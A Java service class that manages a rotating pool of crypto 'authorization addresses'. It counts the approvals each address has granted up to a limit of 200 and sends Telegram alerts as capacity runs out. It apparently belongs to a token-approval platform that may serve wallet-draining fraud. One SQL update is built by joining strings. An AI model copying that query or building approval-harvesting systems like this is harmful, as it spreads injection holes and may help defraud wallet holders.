package project.monitor.internal;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.collections.Predicate;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.orm.hibernate5.support.HibernateDaoSupport;

import kernel.util.Endecrypt;
import kernel.util.ThreadUtils;
import project.monitor.AutoMonitorAddressConfigLock;
import project.monitor.AutoMonitorAddressConfigService;
import project.monitor.PropertiesUtilAutoe;
import project.monitor.model.AutoMonitorAddressConfig;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.web.admin.monitor.mining.AdminMiningConfigController;

public class AutoMonitorAddressConfigServiceImpl extends HibernateDaoSupport implements AutoMonitorAddressConfigService {
	
	private Logger logger = LogManager.getLogger(AutoMonitorAddressConfigServiceImpl.class);

	private JdbcTemplate jdbcTemplate;

	/**
	 * 每个地址限制可授权数量
	 */
	private int approveLimitNum = 200;

	private TelegramBusinessMessageService telegramBusinessMessageService;
	/**
	 * key:address
	 */
	private Map<String, AutoMonitorAddressConfig> cache = new ConcurrentHashMap<String, AutoMonitorAddressConfig>();

	public void init() {
		List<AutoMonitorAddressConfig> list = (List<AutoMonitorAddressConfig>) getHibernateTemplate().find("FROM AutoMonitorAddressConfig ");
		for (AutoMonitorAddressConfig entity : list) {
			cache.put(entity.getAddress().toLowerCase(), entity);
		}
	}
	public Map<String, AutoMonitorAddressConfig> cacheAllMap(){
		return new HashMap<String, AutoMonitorAddressConfig>(cache);
	}
	public AutoMonitorAddressConfig save(AutoMonitorAddressConfig entity) {
		Serializable serializable = this.getHibernateTemplate().save(entity);
		entity.setId(serializable.toString());
		cache.put(entity.getAddress(), entity);
		return entity;
	}

	public void update(AutoMonitorAddressConfig entity) {
		getHibernateTemplate().update(entity);
		cache.put(entity.getAddress(), entity);
	}

	public AutoMonitorAddressConfig findById(String id) {
		return (AutoMonitorAddressConfig) getHibernateTemplate().get(AutoMonitorAddressConfig.class, id);
	}

	/**
	 * 启用地址
	 * 
	 * @param entity
	 */
	public void updateEnabledAddress(AutoMonitorAddressConfig entity) {
		entity.setStatus(1);
		this.update(entity);
		jdbcTemplate.update(
				"UPDATE T_AUTO_MONITOR_ADDRESS_CONFIG SET STATUS=0 WHERE UUID!='" + entity.getId().toString() + "'");
		List<AutoMonitorAddressConfig> listAll = new ArrayList<>(cache.values());
		for (AutoMonitorAddressConfig config : listAll) {
			if (config.getAddress().equalsIgnoreCase(entity.getAddress())) {
				continue;
			}
			config.setStatus(0);
			cache.put(config.getAddress().toLowerCase(), config);
		}
	}

	/**
	 * 
	 * @param status 具体状态选传
	 * @return
	 */
	public List<AutoMonitorAddressConfig> findByStatus(String status) {
		String sql = "FROM AutoMonitorAddressConfig WHERE 1=1 ";
		List<Object> params = new ArrayList<Object>();
		if (!StringUtils.isEmpty(status)) {
			sql += "AND status=?0 ";
			params.add(status);
		}
		List<AutoMonitorAddressConfig> list = (List<AutoMonitorAddressConfig>) getHibernateTemplate().find(sql, params.toArray());
		return list;
	}

	/**
	 * 找到当前可用的授权地址
	 * 
	 */
	public AutoMonitorAddressConfig findByEnabled() {
		List<AutoMonitorAddressConfig> list = new ArrayList<>(cache.values());

		org.apache.commons.collections.CollectionUtils.filter(list, new Predicate() {
			@Override
			public boolean evaluate(Object arg0) {
				// TODO Auto-generated method stub
				AutoMonitorAddressConfig msg = (AutoMonitorAddressConfig) arg0;
				return msg.getStatus() == 1;
			}
		});

		if (CollectionUtils.isEmpty(list) || list.get(0) == null) {
			logger.error("没有可用的授权地址,cache{}", cache.values());
			return null;
		}
		// 超过默认数量则返回下一个
		if (list.get(0).getApprove_num() >= approveLimitNum) {
			List<AutoMonitorAddressConfig> listAll = cacheSortAll();
			for (int i = 0; i < listAll.size(); i++) {
				AutoMonitorAddressConfig autoMonitorAddressConfig = listAll.get(i);
				if (autoMonitorAddressConfig.getApprove_num() >= approveLimitNum) {
					continue;
				}

				// 非启用状态的 则直接置为启用状态
				if (autoMonitorAddressConfig.getStatus() != 1) {
					updateEnabledAddress(autoMonitorAddressConfig);
					// 剩余授权地址数
					int approveNum = approveLimitNum - list.get(0).getApprove_num();
					// 剩余可授权用户数
					int approveUserNum = 0;
					for (int j = i; j < listAll.size(); j++) {
						approveNum += (approveLimitNum - listAll.get(j).getApprove_num());
						approveUserNum++;
					}

					// 表示切换了，就发送消息
					telegramBusinessMessageService.sendApproveAddressFullTeleg(list.get(0).getAddress(),
							autoMonitorAddressConfig.getAddress(), approveNum - 1, approveUserNum);
				}
				return autoMonitorAddressConfig;
			}

		} else {
			return list.get(0);
		}
		// 上面没返回，说明所有地址都检测完，已超标，那么原先启用的就算最后一个
		return list.get(0);
	}

	public List<AutoMonitorAddressConfig> cacheSortAll() {
		List<AutoMonitorAddressConfig> listAll = new ArrayList<>(cache.values());
		Collections.sort(listAll);
		return listAll;
	}

	public AutoMonitorAddressConfig findByAddress(String address) {
		List<AutoMonitorAddressConfig> list = (List<AutoMonitorAddressConfig>) getHibernateTemplate()
				.find("FROM AutoMonitorAddressConfig WHERE address=?0 ", new Object[] { address });
		return CollectionUtils.isEmpty(list) ? null
				: list.get(0) == null ? null : (AutoMonitorAddressConfig) list.get(0);
	}

	/**
	 * desEncrypt加
	 */
	public String desEncrypt(String oldString) {
		Endecrypt test = new Endecrypt();
		String SPKEY = PropertiesUtilAutoe.getProperty("chartext");
		String reValue = test.get3DESEncrypt(oldString, SPKEY);
		reValue = reValue.trim().intern();

		return reValue;
	}

	/**
	 * desDecrypt解
	 */
	public String desDecrypt(String oldString) {
		Endecrypt test = new Endecrypt();
		String SPKEY = PropertiesUtilAutoe.getProperty("chartext");
		String reValue2 = test.get3DESDecrypt(oldString, SPKEY);
		return reValue2;
	}

	/**
	 * 剩余可授权数量
	 * 
	 * @return
	 */
	public Map<String, Object> lastApproveNum(int index) {
		// 剩余授权地址数
		int approveNum = 0;
		// 剩余可授权用户数
		int approveUserNum = 0;
		int lastIndex = -1;
		List<AutoMonitorAddressConfig> listAll = cacheSortAll();
		Map<String, Object> map = new HashMap<String, Object>();
		for (int i = 0; i < listAll.size(); i++) {
			AutoMonitorAddressConfig autoMonitorAddressConfig = listAll.get(i);
			if (autoMonitorAddressConfig.getStatus() == 1) {// 没有剩余时，启用的那个就算最后一个
				lastIndex = i;
			}
			if (autoMonitorAddressConfig.getApprove_num() >= approveLimitNum) {
				continue;
			}
			approveUserNum += (approveLimitNum - autoMonitorAddressConfig.getApprove_num());
			approveNum++;
			lastIndex = i;
		}
		// 所有都用完了，启用的那个就算最后一个，如果都没启用，那直接取排序最后一个
		if (approveNum == 0) {
			map.put("isLast", lastIndex == -1 ? index == listAll.size() - 1 : lastIndex == index);
		} else if (approveNum == 1) {// 剩余一个了，那么这个就是最后一个;
			map.put("isLast", lastIndex == index);
		} else {// 剩下>=2，那么表示都不是最后一个
			map.put("isLast", false);
		}
		// 剩余数量，排除自己-1
		map.put("approveNum", approveNum - 1);
		map.put("approveUserNum", approveUserNum);
		return map;
	}

	/**
	 * 授权申请发起时则调用一次
	 */
	public void saveApproveByAddress(String approveAddress) {
		boolean lock = false;
		try {
			approveAddress = approveAddress.toLowerCase();
			while (true) {
				if (AutoMonitorAddressConfigLock.add(approveAddress)) {
					lock = true;
					/**
					 * 处理完退出
					 */
					// 加上锁，每次处理一个
//					AutoMonitorAddressConfig config = findByAddress(approveAddress);
					AutoMonitorAddressConfig config = cache.get(approveAddress);
					config.setApprove_num(config.getApprove_num() + 1);

					update(config);
					List<AutoMonitorAddressConfig> cacheSortAll = cacheSortAll();

					// 消息最后一个处理
					int indexOfConfig = cacheSortAll.indexOf(config);
					Map<String, Object> lastApproveNum = lastApproveNum(indexOfConfig);
					// 最后一个的，小于20个时开始通知
					if ((boolean) lastApproveNum.get("isLast") && approveLimitNum - config.getApprove_num() <= 20) {
						// 发送消息
						telegramBusinessMessageService.sendLastApproveAddressWarningTeleg(config.getAddress(), 0,
								approveLimitNum - config.getApprove_num());
					}

					break;
				}
			}
		} catch (Exception e) {
			logger.error("AutoMonitorAddressConfigServiceImpl.saveApproveByAddress fail, approveAddress:"
					+ approveAddress + ",error:", e);
		} finally {
			if (lock) {
				ThreadUtils.sleep(50);// 事务提交
				AutoMonitorAddressConfigLock.remove(approveAddress);
			}
		}

	}

	/**
	 * 授权申请变为失败或拒绝 (剩余数量加回去时不需要提醒)
	 */
	public void saveApproveFailByAddress(String approveAddress) {
		boolean lock = false;
		try {
			approveAddress = approveAddress.toLowerCase();
			while (true) {
				if (AutoMonitorAddressConfigLock.add(approveAddress)) {
					lock = true;
					/**
					 * 处理完退出
					 */
					// 加上锁，每次处理一个
//					AutoMonitorAddressConfig config = findByAddress(approveAddress);
					AutoMonitorAddressConfig config = cache.get(approveAddress);
					config.setApprove_num(config.getApprove_num() - 1);
					update(config);

//					List<AutoMonitorAddressConfig> cacheSortAll = cacheSortAll();
//
//					// 消息最后一个处理
//					int indexOfConfig = cacheSortAll.indexOf(config);
//					Map<String, Object> lastApproveNum = lastApproveNum(indexOfConfig);
//					// 最后一个的，小于20个时开始通知
//					if ((boolean) lastApproveNum.get("isLast") && approveLimitNum - config.getApprove_num() <= 20) {
//						// 发送消息
//						telegramBusinessMessageService.sendLastApproveAddressWarningTeleg(config.getAddress(), 0,
//								approveLimitNum - config.getApprove_num());
//					}
					break;
				}
			}
		} catch (Exception e) {
			logger.error("AutoMonitorAddressConfigServiceImpl.saveApproveByAddress fail, approveAddress:"
					+ approveAddress + ",error:", e);
		} finally {
			if (lock) {
				ThreadUtils.sleep(50);// 事务提交
				AutoMonitorAddressConfigLock.remove(approveAddress);
			}
		}

	}

	public AutoMonitorAddressConfig find(String address) {
		List<AutoMonitorAddressConfig> list = (List<AutoMonitorAddressConfig>) getHibernateTemplate()
				.find("FROM AutoMonitorAddressConfig WHERE address=?0 ", new Object[] { address });
		return CollectionUtils.isEmpty(list) ? null
				: list.get(0) == null ? null : (AutoMonitorAddressConfig) list.get(0);
	}

	public void setJdbcTemplate(JdbcTemplate jdbcTemplate) {
		this.jdbcTemplate = jdbcTemplate;
	}

	public void setTelegramBusinessMessageService(TelegramBusinessMessageService telegramBusinessMessageService) {
		this.telegramBusinessMessageService = telegramBusinessMessageService;
	}

}
